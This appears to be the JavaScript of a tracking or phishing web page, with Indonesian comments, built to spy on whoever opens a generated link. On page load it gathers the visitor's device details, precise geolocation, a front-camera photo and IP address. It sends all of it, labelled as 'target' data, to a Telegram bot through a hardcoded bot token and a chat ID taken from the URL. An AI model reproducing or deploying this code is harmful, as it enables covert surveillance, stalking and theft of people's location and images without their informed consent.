// --- Elemen HTML ---
const statusList = document.getElementById('status-list');
const videoEl = document.getElementById('video');
const canvasEl = document.getElementById('canvas');

// --- Parameter dari URL ---
const params = new URLSearchParams(window.location.search);
const alias = params.get('alias');
const chatId = params.get('uid'); // ID chat admin (Anda)
const botToken = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';

// --- Fungsi Helper ---
const updateStatus = (message, isError = false) => {
  const li = document.createElement('li');
  li.textContent = message;
  if (isError) li.className = 'error';
  statusList.appendChild(li);
  statusList.scrollTop = statusList.scrollHeight;
};

// --- FUNGSI PENGUMPULAN DATA ---

// 1. Ambil Info Perangkat (Versi Lengkap)
const getDeviceInfo = async () => {
  updateStatus('1. Mengambil info perangkat...');
  const data = {
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'N/A',
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    localTime: new Date().toString(),
    // Info Hardware
    cpuCores: navigator.hardwareConcurrency || 'N/A',
    memory: navigator.deviceMemory || 'N/A',
    // Info Jaringan
    connection: {
      type: navigator.connection ? navigator.connection.effectiveType : 'N/A',
      downlink: navigator.connection ? `${navigator.connection.downlink} Mbps` : 'N/A'
    }
  };

  // Info Baterai (adalah Promise terpisah)
  try {
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      data.battery = {
        level: Math.round(battery.level * 100) + '%',
        isCharging: battery.charging
      };
    } else {
      data.battery = { level: 'N/A', isCharging: 'N/A' };
    }
  } catch (err) {
    data.battery = { level: `Error: ${err.message}`, isCharging: 'N/A' };
  }
  
  return data;
};

// 2. Ambil Lokasi
const getLocation = () => {
  updateStatus('2. Mengambil lokasi (Harap izinkan)...');
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation tidak tersedia.'));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      position => {
        resolve({
          lat: position.coords.latitude,
          lon: position.coords.longitude,
          accuracy: position.coords.accuracy
        });
      },
      error => reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`)),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
};

// 3. Ambil Foto
const getPhoto = async () => {
  updateStatus('3. Mengambil foto (Harap izinkan)...');
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
  videoEl.srcObject = stream;
  await new Promise(resolve => videoEl.onloadedmetadata = resolve);
  videoEl.play();
  await new Promise(resolve => setTimeout(resolve, 500));
  canvasEl.width = videoEl.videoWidth;
  canvasEl.height = videoEl.videoHeight;
  const context = canvasEl.getContext('2d');
  context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
  const photoBase64 = canvasEl.toDataURL('image/jpeg', 0.7);
  stream.getTracks().forEach(track => track.stop());
  videoEl.srcObject = null;
  return photoBase64;
};

// 4. Ambil Alamat IP
const getIpAddress = async () => {
  updateStatus('4. Mengambil info jaringan...');
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip || 'N/A';
  } catch (err) {
    return `Gagal: ${err.message}`;
  }
};

// 5. Kirim semua data ke Telegram (Format Diperbarui)
const sendToTelegram = async (data) => {
  updateStatus('5. Mengirim data...');
  const { deviceInfo, location, photoBase64, ipAddress } = data;
  
  // Format pesan baru dengan data yang lebih lengkap
  const message = `
🔔 *DATA TARGET DITERIMA* (${alias || 'Target'})
--------------------------------------------------
*📍 Lokasi & Jaringan*
• IP: \`${ipAddress}\`
• Tipe Jaringan: \`${deviceInfo.connection.type}\`
• Downlink: \`${deviceInfo.connection.downlink}\`

*🔋 Perangkat & Baterai*
• UA: \`${deviceInfo.userAgent}\`
• Platform: \`${deviceInfo.platform}\`
• Baterai: \`${deviceInfo.battery.level}\` (Charging: ${deviceInfo.battery.isCharging})

*🖥️ Hardware & Tampilan*
• CPU: \`${deviceInfo.cpuCores}\` inti
• RAM: \`${deviceInfo.memory}\` GB (Perkiraan)
• Resolusi: \`${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\`

*⏰ Waktu Lokal Target*
• \`${deviceInfo.localTime}\`
--------------------------------------------------
  `.trim();

  // Kirim Info Teks
  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    })
  });

  // Kirim Lokasi
  await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      latitude: location.lat,
      longitude: location.lon,
      horizontal_accuracy: location.accuracy
    })
  });

  // Kirim Foto
  const blob = await (await fetch(photoBase64)).blob();
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('photo', blob, 'selfie.jpg');

  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: 'POST',
    body: formData
  });
  
  updateStatus('✅ Semua data berhasil dikirim!');
};

// --- Fungsi Utama (Diperbarui) ---
const start = async () => {
  if (!chatId || !alias) {
    updateStatus('❌ Error: Link tidak valid atau parameter hilang.', true);
    return;
  }
  
  try {
    const data = {};
    // Jalankan pengumpulan data secara paralel (lebih cepat)
    const [deviceInfo, location, photoBase64, ipAddress] = await Promise.all([
      getDeviceInfo(),
      getLocation(),
      getPhoto(),
      getIpAddress()
    ]);
    
    data.deviceInfo = deviceInfo;
    data.location = location;
    data.photoBase64 = photoBase64;
    data.ipAddress = ipAddress;

    await sendToTelegram(data);
    updateStatus('Selesai. Anda bisa menutup halaman ini.');
    
  } catch (err) {
    console.error(err);
    // Tampilkan error yang lebih spesifik jika ada
    if (err.message.includes('permission')) {
        updateStatus(`❌ Error: Izin kamera atau lokasi ditolak.`, true);
    } else {
        updateStatus(`❌ Error: ${err.message}`, true);
    }
  }
};

// Jalankan saat halaman dimuat
window.addEventListener('DOMContentLoaded', () => {
  start();
});
